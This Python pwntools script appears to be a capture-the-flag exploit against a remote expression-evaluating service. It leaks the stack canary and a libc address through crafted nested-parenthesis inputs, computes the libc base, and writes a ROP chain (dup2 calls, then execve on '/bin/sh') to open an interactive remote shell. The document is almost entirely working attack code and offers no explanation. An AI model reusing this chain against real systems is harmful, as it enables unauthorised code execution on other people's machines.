#!/usr/bin/env python
from pwn import *
from ctypes import c_uint32

host = 'h4x.0x04.net'
port = 31337

stack_size = 21

def to_uint32(message):
    return c_uint32(int(message.strip())).value

def get_canary_offset(p):
    message = '1'
    canary_offset = 1

    while True:
        message = '(' + '('*canary_offset + ')'*canary_offset
        p.sendline(message)
        p.recvline()

        if p.can_recv():
            break;
        else:
            canary_offset += 1
    canary_offset -= 1

    return canary_offset

def get_stack(p, canary_offset):
    stack = [0 for _ in range(stack_size)]

    for i in range(stack_size):
        message = '(' * (canary_offset + i + 1)
        message += ')' * 3

        j = i - 1
        while j >= 0:
            message += '+' + str(stack[j]) + ')'
            j -= 1

        message += ')' * (canary_offset - 3)

        p.sendline(message)
        stack[i] = c_uint32(to_uint32(p.recvline()) - sum(stack)).value

    return stack

def restore_stack(canary_offset, stack):
    message = '(' * (canary_offset + len(stack) - 1)
    message += str(stack[(len(stack) - 1)])
    message += ')' * 3

    i = len(stack) - 2
    while i >= 0:
        message += '+' + str(stack[i]) + ')'
        i -= 1

    message += ')' * (canary_offset - 3)

    return message


p = connect(host, port)
# canary_offset = get_canary_offset(p)
canary_offset = 31
p.close()
print('[!] Canary offset found: ' + str(canary_offset))

p = connect(host, port)

stack = get_stack(p, canary_offset)
canary = stack[0]
print('[!] Canary found: ' + str(hex(canary)))

libc_start_main = stack[20]

libc_elf = ELF('./libc-2.19.so')

lsm_libc = libc_elf.symbols['__libc_start_main']
libc_base = (libc_start_main - lsm_libc) & 0xfffff000

print('[!] libc base address found: ' + str(hex(libc_base)))

dup2 = libc_base + libc_elf.symbols['dup2']

execve = libc_base + libc_elf.symbols['execve']

binsh = libc_base + list(libc_elf.search('/bin/sh'))[0]

pop2 = libc_base + 188715       # found by ropsearch

return_address = 4

stack[return_address+12] = 0
stack[return_address+11] = 0
stack[return_address+10] = binsh
stack[return_address+9] = 0
stack[return_address+8] = execve

stack[return_address+7] = 1
stack[return_address+6] = 4
stack[return_address+5] = pop2
stack[return_address+4] = dup2

stack[return_address+3] = 0
stack[return_address+2] = 4
stack[return_address+1] = pop2
stack[return_address] = dup2

message = restore_stack(canary_offset, stack)

p.sendline(message)
p.interactive()
